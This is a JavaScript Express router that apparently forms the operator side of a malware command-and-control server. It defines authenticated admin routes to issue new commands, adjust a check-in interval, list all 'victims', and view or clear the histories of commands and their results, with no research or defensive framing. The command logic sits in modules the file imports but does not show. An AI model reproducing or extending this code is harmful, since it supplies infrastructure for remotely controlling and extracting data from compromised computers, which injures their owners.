const express = require("express");
const router = express.Router();
const Module = require("../modules/adminModule");
const authMiddleware = require("../middleware/authMiddleware");
const path = require("path");

// static

router.get("/login", function (req, res) {
	res.sendFile(path.join(__dirname, "../static/login.html"));
});

router.get("/register", function (req, res) {
	res.sendFile(path.join(__dirname, "../static/register.html"));
});

router.get("/dashboard", function (req, res) {
	res.sendFile(path.join(__dirname, "../static/dashboard.html"));
});

// admin auth

router.post("/login", Module.login);
router.post("/register", Module.register);
router.post("/refresh", Module.refresh);

// admin actions

router.post("/newcmd", authMiddleware.verifyJWT, Module.addNewCmd);
router.delete("/deleteaccount", authMiddleware.verifyJWT, Module.deleteAccount);
router.patch(
	"/updateinterval",
	authMiddleware.verifyJWT,
	Module.updateInterval,
);
router.get("/getallvictims", authMiddleware.verifyJWT, Module.getAllVictims);
router.get("/commandhistory", authMiddleware.verifyJWT, Module.commandHistory);
router.delete(
	"/clearcommandhistory",
	authMiddleware.verifyJWT,
	Module.clearCommandHistory,
);
router.get(
	"/commandresulthistory",
	authMiddleware.verifyJWT,
	Module.commandResultHistory,
);
router.delete(
	"/clearcommandresulthistory",
	authMiddleware.verifyJWT,
	Module.clearCommandResultHistory,
);

module.exports = router;
